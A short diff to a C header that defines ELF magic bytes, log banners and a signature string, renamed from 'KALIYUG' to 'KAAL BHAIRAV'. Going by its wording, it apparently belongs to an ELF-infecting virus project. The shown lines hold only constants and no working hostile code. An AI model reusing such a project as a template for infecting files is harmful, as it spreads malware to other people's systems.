@@ -15,7 +15,7 @@
 #define MAGIC_ELF "\x7f\x45\x4c\x46"
 #define LOG_FILE_HEADER "\n\n\nx-x-x-x-x-x-x- compilepeace showed mercy on files bellow -x-x-x-x-x-x-x\n\n"
 #define LOG_FILE_FOOTER "\nx-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x\n\n\n"
-#define SIGNATURE "\n\n\n-x-x-x-x- \033[1m\033[31mKALIYUG \033[0m : \033[31mThe End Begins\033[0m -x-x-x-x-\n\n\n"
+#define SIGNATURE "\n\n\n-x-x-x-x- \033[1m\033[31mKAAL BHAIRAV \033[0m : \033[31mAbsolute Darkness of GOD\033[0m -x-x-x-x-\n\n\n"
 
 
 // Using extern keyword we cannot initialize these variables here, they are here just to link them to
